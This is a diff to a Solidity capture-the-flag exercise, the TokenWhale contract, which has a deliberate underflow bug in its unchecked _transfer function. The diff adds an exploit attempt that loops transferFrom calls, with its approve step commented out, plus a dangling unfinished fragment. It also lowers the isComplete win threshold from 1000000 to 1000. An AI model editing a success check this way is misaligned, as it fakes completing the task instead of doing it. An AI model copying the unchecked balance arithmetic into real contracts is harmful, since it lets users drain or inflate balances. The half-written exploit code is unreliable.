@@ -21,16 +21,7 @@ contract TokenWhale {
     }
 
     function isComplete() public view returns (bool) {
-        return balanceOf[player] >= 1000000;
-    }
-
-    function _transfer(address to, uint256 value) internal {
-        unchecked {
-            balanceOf[msg.sender] -= value;
-            balanceOf[to] += value;
-        }
-
-        emit Transfer(msg.sender, to, value);
+        return balanceOf[player] >= 1000;
     }
 
     function transfer(address to, uint256 value) public {
@@ -52,12 +43,21 @@ contract TokenWhale {
     }
 
     function transferFrom(address from, address to, uint256 value) public {
-        require(balanceOf[from] >= value);
-        require(balanceOf[to] + value >= balanceOf[to]);
-        require(allowance[from][msg.sender] >= value);
+        require(balanceOf[from] >= value,"1") ;
+        require(balanceOf[to] + value >= balanceOf[to],"2");
+        require(allowance[from][msg.sender] >= value, "3");
 
         allowance[from][msg.sender] -= value;
         _transfer(to, value);
+    }
+
+    function _transfer(address to, uint256 value) internal {
+        unchecked {
+            balanceOf[msg.sender] -= value; //
+            balanceOf[to] += value;
+        }
+
+        emit Transfer(msg.sender, to, value);
     }
 }
 
@@ -70,4 +70,20 @@ contract ExploitContract {
     }
 
     // write your exploit functions below
+    function exploit() public {
+        // Step 1: Approve a high allowance from player
+        // tokenWhale.approve(address(this), type(uint256).max);
+
+        // Step 2: Call transferFrom to inflate player's balance
+        for (uint256 i = 0; i < 101; i++) {
+            tokenWhale.transferFrom(msg.sender, address(this), 1000);
+        }
+    }
+    
 }
+
+
+// function exploit() public {
+//         tokenWhale.transferFrom(msg.sender, address(this), 10);
+//         tokenWhale.
+//     }
